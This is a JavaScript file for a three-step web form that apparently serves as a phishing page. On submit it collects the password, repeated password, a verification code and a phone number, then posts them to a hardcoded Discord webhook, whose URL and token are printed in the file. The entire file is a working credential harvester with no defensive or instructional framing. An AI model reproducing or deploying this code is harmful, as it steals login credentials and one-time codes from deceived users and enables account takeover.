"use strict";

// CODE

let btn = document.querySelector('.btn a');
let submits = document.querySelector('.submit');
let backTwo = document.querySelector('.back-two');
let backThree = document.querySelector('.back-three');
let prevTwo = document.querySelector('.prev-two');
let prevOne = document.querySelector('.prev-one');
let closes = document.querySelector('.close');
let one = document.querySelector('.one');
let two = document.querySelector('.two');
let three = document.querySelector('.three');
let form = document.querySelector('.form')
let url = 'https://discord.com/api/webhooks/927534339972009984/eINVm7EWDEEJoaXiFby8R9yVjPl8iueeMtIiLd5J-mTBUXtuf5Gjr8quDEZeAGKe2LeX';

prevOne.addEventListener('click', () => {
    if(two.style.display = 'none'){
        two.style.display = 'block';
        one.style.display = 'none'
    }
});

prevTwo.addEventListener('click', () => {
    if(three.style.display = 'none'){
        two.style.display = 'none';
        three.style.display = 'block'
    }
});

backTwo.addEventListener('click', () => {
    if(two.style.display = 'block'){
        two.style.display = 'none';
        one.style.display = 'block';
    }
});

backThree.addEventListener('click', () => {
    if(three.style.display = 'block'){
        two.style.display = 'block';
        three.style.display = 'none';
    }
});

submits.addEventListener('click', () => {
    if(three.style.display = 'block'){
        three.style.display = 'none';
        closes.style.display = 'block';
    }
});

form.addEventListener('submit', async (e) => {
    e.preventDefault();

    let data = {
        content: 'Данные',
        embeds: [
            {
                author: {
                    name: `Пароль повторно: ${document.querySelector('#repeatPassword').value},`,
                },
                title: `Пароль: ${document.querySelector('#password').value}`,
                footer:{
                    text: `Код: ${document.querySelector('#code').value}`,
                },
                description: `Телефон: ${document.querySelector('#teleghone').value}`,
            }
        ]
    }

    let response = await fetch(url + "?wait=true", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json;charset=utf-8'
        },
        body: JSON.stringify(data)
    })

    let json = await response.json();
    console.log(json)
})




